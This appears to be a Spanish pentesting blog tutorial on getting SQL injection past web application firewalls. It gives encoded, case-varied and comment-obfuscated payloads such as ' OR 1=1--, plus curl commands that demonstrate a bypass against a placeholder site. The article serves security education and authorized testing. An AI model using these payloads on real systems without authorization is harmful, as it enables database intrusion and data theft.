# SQL Injection Avanzado: Bypassing WAF Modernos

En el pentesting web moderno, uno de los mayores desafíos es evadir los **Web Application Firewalls (WAF)** que protegen aplicaciones vulnerables. En este artículo, exploraremos técnicas avanzadas de bypass.

## ¿Qué es un WAF?

Un WAF es una barrera de seguridad que analiza el tráfico HTTP/HTTPS en busca de patrones maliciosos. Los WAFs modernos utilizan:

- Expresiones regulares
- Machine Learning
- Análisis heurístico
- Listas negras de payloads conocidos

## Técnicas de Bypass

### 1. Codificación y Ofuscación

Una de las técnicas más efectivas es la codificación múltiple:
```sql
-- Payload normal (bloqueado)
' OR 1=1--

-- URL Encoding
%27%20OR%201%3D1--

-- Double URL Encoding
%2527%2520OR%25201%253D1--

-- Unicode Encoding
\u0027 OR 1=1--
```

### 2. Case Manipulation

Muchos WAFs son case-sensitive en sus reglas:
```sql
' oR 1=1--
' Or 1=1--
' OR 1=1--
```

### 3. Comentarios Inline

Insertar comentarios dentro del payload:
```sql
' OR/**/1=1--
' OR/*comment*/1/*another*/=/**/1--
```

## Ejemplo Práctico

Supongamos que tenemos este endpoint vulnerable:
```
https://vulnerable-site.com/search?id=1
```

**Paso 1**: Detectar el WAF
```bash
curl -X GET "https://vulnerable-site.com/search?id=1' OR 1=1--"
# Response: 403 Forbidden (WAF detectado)
```

**Paso 2**: Aplicar bypass con codificación
```bash
curl -X GET "https://vulnerable-site.com/search?id=1'/**/OR/**/1=1--"
# Response: 200 OK (Bypass exitoso)
```

## Herramientas Útiles

- **SQLMap**: Incluye tamper scripts para bypass
- **Burp Suite**: Intruder con payloads personalizados
- **WAFNinja**: Herramienta especializada en bypass

## Conclusión

El bypass de WAF es un arte que requiere:

1. Entender cómo funciona el WAF objetivo
2. Probar múltiples técnicas de codificación
3. Ser creativo con la ofuscación
4. Documentar qué funciona y qué no

> **Nota Importante**: Estas técnicas son para uso educativo y pruebas autorizadas únicamente.

## Referencias

- OWASP WAF Evasion Guide
- PortSwigger SQL Injection Cheat Sheet
- PentesterLab Advanced SQL Injection
```
